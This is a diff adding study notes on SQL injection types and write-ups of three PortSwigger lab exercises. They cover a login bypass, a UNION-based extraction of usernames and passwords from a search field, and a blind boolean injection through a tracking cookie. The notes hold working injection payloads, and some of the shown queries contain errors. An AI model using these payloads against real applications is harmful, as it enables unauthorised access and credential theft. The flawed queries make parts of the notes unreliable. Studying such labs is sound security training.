@@ -1,0 +1,93 @@
+there are 3 types
+
+In-Band (classic) sql injection - the communication channel where you send the payload is the same channel where you recive the response
+Inferential (Blind) sql injection - simmilar to the In-Band but you dont recieve the responce in the exact same channel - basically asking true or false question instead of asking the app to give the result the payload
+Out-of-Band sql injection - you dont get anything in the same communication channel 
+
+
+admin'--
+that becomes: select * from users where username = 'admin' -- ' and password = '';
+
+
+====================================================================================================================================================================================
+1. lab (https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+
+Assumptions:
+    username = administrator
+
+    select * from users where username = 'administrator'--' and password = ''
+
+
+entering administrator'-- as username in the form -> gives access   
+
+this one is In-Band sql injection
+
+====================================================================================================================================================================================
+2. lab (https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+
+Assumptions:
+    username = administrator
+    users tables
+    username and passowrd columns
+
+UNION:
+1. same number of columns
+' order by 1--
+2. same type columns
+' UNION select 'a', 'a' --
+
+
+All of this in burp suite: to repeatar + url encode
+
+!!! Search field is vulnerable !!!
+
+
+select * from categoryTable where category = 'Corporate Gifts' order by 1--                     >> we got 200 OK
+select * from categoryTable where category = 'Corporate Gifts' order by 2--                     >> we got 200 OK
+select * from categoryTable where category = 'Corporate Gifts' order by 3--                     >> we got 500 Internal server error
+
+>>>> there are 2 columns !!!
+
+select * from categoryTable where category = 'Corporate Gifts' UNION select 'a', 'a' --        >> we got 200 OK 
+
+>>>> both columns accept strings
+
+
+select * from categoryTable where category = 'Corporate Gifts' UNION select username, password from users --
+
+we got usernames and passwords - we need to extract the hashes - perform the dictionary attack
+
+this one is called UNION based In-Band sql injection
+
+
+====================================================================================================================================================================================
+3. lab (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+Assumptions:
+    users tables
+    username and password columns
+    administrator username
+
+
+There is a welcome back message - indicating there is a tracking mechanism - cookies
+
+Lets edit the Cookies section - exploiting TrackingId since that is a custom cookie 
+
+this is a blind sql injection - asking true false questions. The 'welcome back' message will be the true false indicator
+
+
+lets assume the queery: 
+    select * from TrackingIDTable where trackingId='WNnEFCt0TqFqF25Y' and 1==1 --'                   >> we got the welcome back message
+
+    select * from TrackingIDTable where trackingId='WNnEFCt0TqFqF25Y' and 1==0 --'                   >> we did not got the welcome back message
+
+        >>> it is vulnerable!
+
+    select * from TrackingIDTable where trackingId='WNnEFCt0TqFqF25Y' and (select password for users where username = 'administrator')='Password1!'-- '  >> not smart (limitless options)
+
+    the smarter way is to ask if the first letter is a, b, c ... -> python script
+
+    python3 slqInjectionLab3.py https://0a0a00ce044b1007803df8f30070009b.web-security-academy.net/
+        got the password
+
+
